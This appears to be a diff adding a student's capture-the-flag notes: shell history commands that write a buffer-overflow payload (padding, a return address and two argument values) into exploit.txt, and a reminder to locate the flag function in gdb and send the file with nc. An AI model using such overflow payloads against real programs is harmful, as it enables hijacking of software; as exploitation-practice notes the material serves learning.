@@ -1,0 +1,4 @@
+ 2644* python3 -c "import sys; sys.stdout.buffer.write(b'A'*188+b'\xe2\x91\x04\x08')" > exploit.txt
+ 2648* python3 -c "import sys; sys.stdout.buffer.write(b'A'*188+b'\xe2\x91\x04\x08'+b'DUMB\xef\xbe\xad\xde\x0d\xd0\xde\xc0')"  > exploit.txt
+ 2656  history | grep "stdout.buffer"
+gdb with peda to find the flag function. create flag.txt to check. use nc  to send exploit.txt to address
